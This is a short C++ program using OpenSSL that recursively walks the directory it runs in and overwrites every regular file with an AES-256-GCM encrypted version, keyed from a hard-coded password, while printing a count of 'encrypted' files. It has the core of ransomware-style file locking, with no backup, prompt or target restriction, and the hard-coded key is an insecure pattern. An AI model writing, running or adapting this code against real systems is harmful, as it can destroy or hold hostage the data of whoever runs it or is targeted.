#include <openssl/evp.h>
#include <openssl/rand.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>

namespace fs = std::filesystem;

const std::string PASSWORD = "StrongPassword@123";
const std::string MAGIC = "CRYPTO_V1"; // Magic Bytes
constexpr int KEY_SIZE = 32, SALT_SIZE = 16, IV_SIZE = 12, TAG_SIZE = 16, ITER = 100000;

void deriveKey(const unsigned char* salt, unsigned char* key) {
    PKCS5_PBKDF2_HMAC(PASSWORD.c_str(), PASSWORD.size(), salt, SALT_SIZE, ITER, EVP_sha256(), KEY_SIZE, key);
}

bool isAlreadyEncrypted(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    char buf[9]; 
    f.read(buf, MAGIC.size());
    return f.gcount() == MAGIC.size() && std::string(buf, 9) == MAGIC;
}

void encryptFile(const fs::path& filePath) {
    if (isAlreadyEncrypted(filePath)) return;

    std::ifstream inFile(filePath, std::ios::binary);
    std::vector<unsigned char> plain((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    unsigned char salt[SALT_SIZE], iv[IV_SIZE], tag[TAG_SIZE], key[KEY_SIZE];
    RAND_bytes(salt, SALT_SIZE);
    RAND_bytes(iv, IV_SIZE);
    deriveKey(salt, key);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, nullptr);
    EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv);

    std::vector<unsigned char> cipher(plain.size());
    int len;
    EVP_EncryptUpdate(ctx, cipher.data(), &len, plain.data(), (int)plain.size());
    EVP_EncryptFinal_ex(ctx, nullptr, &len);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag);
    EVP_CIPHER_CTX_free(ctx);

    // Overwrite the original file with: MAGIC + SALT + IV + TAG + CIPHER
    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    outFile.write(MAGIC.c_str(), MAGIC.size());
    outFile.write((char*)salt, SALT_SIZE);
    outFile.write((char*)iv, IV_SIZE);
    outFile.write((char*)tag, TAG_SIZE);
    outFile.write((char*)cipher.data(), cipher.size());
}

int main(int argc, char* argv[]) {
    fs::path target = fs::current_path();
    int count = 0;
    for (auto& e : fs::recursive_directory_iterator(target)) {
        if (e.is_regular_file() && e.path().filename() != fs::path(argv[0]).filename()) {
            if (!isAlreadyEncrypted(e.path())) {
                encryptFile(e.path());
                std::cout << "[+] Encrypted: " << e.path().filename() << "\n";
                count++;
            }
        }
    }
    std::cout << "\nTotal Encrypted: " << count << "\nPress Enter...";
    std::cin.get();
    return 0;
}